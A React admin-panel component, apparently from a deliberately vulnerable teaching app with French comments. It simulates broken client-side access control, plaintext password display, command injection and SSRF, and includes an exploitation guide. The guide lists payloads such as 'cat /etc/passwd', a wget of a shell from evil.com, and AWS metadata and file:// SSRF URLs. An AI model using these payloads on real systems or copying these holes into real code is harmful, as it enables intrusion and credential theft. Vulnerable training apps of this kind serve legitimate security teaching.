
import { useState, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { ArrowLeft, AlertTriangle, Settings, Users, Database } from 'lucide-react';
import { toast } from "sonner";

const Admin = () => {
  const [isAdmin, setIsAdmin] = useState(false);
  const [users, setUsers] = useState<Array<{username: string, email: string, password: string}>>([]);
  const [systemCommand, setSystemCommand] = useState('');
  const [commandOutput, setCommandOutput] = useState('');
  const [ssrfUrl, setSsrfUrl] = useState('');
  const [ssrfResponse, setSsrfResponse] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    // VULNÉRABILITÉ 1: CONTRÔLE D'ACCÈS CASSÉ
    // Vérification d'admin basée uniquement sur localStorage (côté client)
    // Peut être facilement contournée en modifiant localStorage
    const adminStatus = localStorage.getItem('isAdmin');
    const sessionId = localStorage.getItem('sessionId');
    console.log('ADMIN CHECK:', { adminStatus, sessionId });

    if (!sessionId) {
      toast.error("Session requise");
      navigate('/login');
      return;
    }

    // VULNÉRABILITÉ: Contrôle d'accès faible - peut être contourné
    if (adminStatus !== 'true') {
      // Affichage d'un avertissement mais pas de redirection forcée
      toast.error("Accès admin requis (mais contournable!)");
      console.log('ADMIN ACCESS BYPASS POSSIBLE - Change localStorage.isAdmin to "true"');
    } else {
      setIsAdmin(true);
    }

    // Charger les utilisateurs (données sensibles exposées)
    const savedUsers = JSON.parse(localStorage.getItem('users') || '[]');
    setUsers(savedUsers);
  }, [navigate]);

  const handleSystemCommand = (e: React.FormEvent) => {
    e.preventDefault();
    
    // VULNÉRABILITÉ 2: INJECTION DE COMMANDES SYSTÈME
    // Les commandes utilisateur sont exécutées sans validation
    console.log('SYSTEM COMMAND INJECTION:', systemCommand);
    
    // Simulation d'exécution de commande (dangereuse en production!)
    let output = '';
    
    if (systemCommand.includes('ls') || systemCommand.includes('dir')) {
      output = 'index.php\nconfig.php\npasswords.txt\nsecret_key.txt\nadmin_backup.sql';
    } else if (systemCommand.includes('cat') || systemCommand.includes('type')) {
      if (systemCommand.includes('passwd') || systemCommand.includes('shadow')) {
        output = 'root:x:0:0:root:/root:/bin/bash\nadmin:$6$salt$hashedpassword';
      } else if (systemCommand.includes('config')) {
        output = 'DB_HOST=localhost\nDB_USER=root\nDB_PASS=admin123\nSECRET_KEY=super_secret_key_123';
      } else {
        output = 'File content would be displayed here...';
      }
    } else if (systemCommand.includes('whoami')) {
      output = 'www-data (web server user)';
    } else if (systemCommand.includes('id')) {
      output = 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
    } else if (systemCommand.includes(';') || systemCommand.includes('&&') || systemCommand.includes('|')) {
      output = 'Multiple commands detected - RCE possible!\nCommand chaining allowed...';
    } else {
      output = `Command "${systemCommand}" executed (simulation)`;
    }

    setCommandOutput(output);
    toast.success("Commande exécutée sans validation!");
  };

  const handleSSRF = (e: React.FormEvent) => {
    e.preventDefault();
    
    // VULNÉRABILITÉ 3: SSRF (Server-Side Request Forgery)
    // L'application fait des requêtes vers des URLs fournies par l'utilisateur
    console.log('SSRF ATTEMPT:', ssrfUrl);
    
    // Simulation de SSRF
    let response = '';
    
    if (ssrfUrl.includes('localhost') || ssrfUrl.includes('127.0.0.1')) {
      response = 'HTTP/1.1 200 OK\nContent: Internal service response\nSensitive internal data exposed!';
    } else if (ssrfUrl.includes('169.254.169.254')) {
      response = 'AWS Metadata Service:\n{\n  "instance-id": "i-1234567890abcdef0",\n  "iam": {\n    "security-credentials": {\n      "access-key": "AKIA...",\n      "secret-key": "xxx"\n    }\n  }\n}';
    } else if (ssrfUrl.includes('file://')) {
      response = 'Local file access via SSRF:\n/etc/passwd content or other sensitive files';
    } else {
      response = `External request to ${ssrfUrl}\nHTTP/1.1 200 OK\nContent-Type: text/html\n\nExternal content fetched...`;
    }

    setSsrfResponse(response);
    toast.success("Requête SSRF exécutée!");
  };

  const forceAdminAccess = () => {
    // Simulation de bypass du contrôle d'accès
    localStorage.setItem('isAdmin', 'true');
    setIsAdmin(true);
    toast.success("Contrôle d'accès contourné!");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-pink-50 p-4">
      <div className="container mx-auto max-w-6xl space-y-6">
        <div className="flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-red-600 hover:text-red-800">
            <ArrowLeft className="h-4 w-4" />
            Retour à l'accueil
          </Link>
          {!isAdmin && (
            <Button onClick={forceAdminAccess} className="bg-red-600 hover:bg-red-700">
              Forcer l'accès admin
            </Button>
          )}
        </div>

        {/* Alerte de contrôle d'accès */}
        {!isAdmin && (
          <Alert className="border-red-200">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription className="text-red-700">
              <strong>Accès refusé:</strong> Privilèges administrateur requis. 
              Cependant, ce contrôle peut être contourné en modifiant localStorage.isAdmin = "true"
            </AlertDescription>
          </Alert>
        )}

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
          {/* Gestion des utilisateurs */}
          <Card className="border-red-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Users className="h-5 w-5" />
                <AlertTriangle className="h-4 w-4 text-red-600" />
                Utilisateurs
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {users.length > 0 ? (
                  users.map((user, index) => (
                    <div key={index} className="border rounded p-3 bg-gray-50">
                      <div className="text-sm">
                        <strong>User:</strong> {user.username}<br />
                        <strong>Email:</strong> {user.email}<br />
                        {/* VULNÉRABILITÉ: DIVULGATION DE MOTS DE PASSE */}
                        <strong className="text-red-600">Password:</strong> 
                        <span className="text-red-600"> {user.password}</span>
                      </div>
                    </div>
                  ))
                ) : (
                  <p className="text-gray-500">Aucun utilisateur inscrit</p>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Injection de commandes système */}
          <Card className="border-orange-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Settings className="h-5 w-5" />
                <AlertTriangle className="h-4 w-4 text-orange-600" />
                Commandes Système
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSystemCommand} className="space-y-4">
                <div>
                  <Label htmlFor="command">Commande à exécuter</Label>
                  <Input
                    id="command"
                    value={systemCommand}
                    onChange={(e) => setSystemCommand(e.target.value)}
                    placeholder="ls -la; cat /etc/passwd"
                  />
                </div>
                <Button type="submit" className="w-full bg-orange-600 hover:bg-orange-700">
                  Exécuter (injection possible!)
                </Button>
              </form>

              {commandOutput && (
                <div className="mt-4 p-3 bg-black text-green-400 rounded text-xs font-mono">
                  <pre>{commandOutput}</pre>
                </div>
              )}
            </CardContent>
          </Card>

          {/* SSRF */}
          <Card className="border-purple-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Database className="h-5 w-5" />
                <AlertTriangle className="h-4 w-4 text-purple-600" />
                Requête Externe (SSRF)
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSSRF} className="space-y-4">
                <div>
                  <Label htmlFor="url">URL à requêter</Label>
                  <Input
                    id="url"
                    value={ssrfUrl}
                    onChange={(e) => setSsrfUrl(e.target.value)}
                    placeholder="http://127.0.0.1:8080/admin"
                  />
                </div>
                <Button type="submit" className="w-full bg-purple-600 hover:bg-purple-700">
                  Faire la requête
                </Button>
              </form>

              {ssrfResponse && (
                <div className="mt-4 p-3 bg-gray-100 rounded text-xs">
                  <strong>Réponse:</strong>
                  <pre className="mt-2 text-red-600">{ssrfResponse}</pre>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Guide d'exploitation pour admin */}
        <Card className="border-red-300">
          <CardHeader>
            <CardTitle className="text-red-700">Guide d'exploitation - Panel Admin</CardTitle>
          </CardHeader>
          <CardContent className="text-sm space-y-4">
            <div>
              <strong className="text-red-600">1. Contrôle d'accès cassé:</strong>
              <p>Ouvrez les outils de développement → Console → Tapez: <code>localStorage.setItem('isAdmin', 'true')</code></p>
            </div>
            
            <div>
              <strong className="text-orange-600">2. Injection de commandes:</strong>
              <ul className="ml-4 mt-1 space-y-1">
                <li>• <code>ls -la</code> - Lister les fichiers</li>
                <li>• <code>cat /etc/passwd</code> - Lire fichiers système</li>
                <li>• <code>whoami; id</code> - Chaînage de commandes</li>
                <li>• <code>ls; wget http://evil.com/shell.php</code> - Télécharger des fichiers malveillants</li>
              </ul>
            </div>
            
            <div>
              <strong className="text-purple-600">3. SSRF (Server-Side Request Forgery):</strong>
              <ul className="ml-4 mt-1 space-y-1">
                <li>• <code>http://127.0.0.1:22</code> - Scanner les ports internes</li>
                <li>• <code>http://169.254.169.254/latest/meta-data/</code> - AWS metadata (cloud)</li>
                <li>• <code>file:///etc/passwd</code> - Lecture de fichiers locaux</li>
                <li>• <code>http://localhost:3306</code> - Accès base de données interne</li>
              </ul>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Admin;
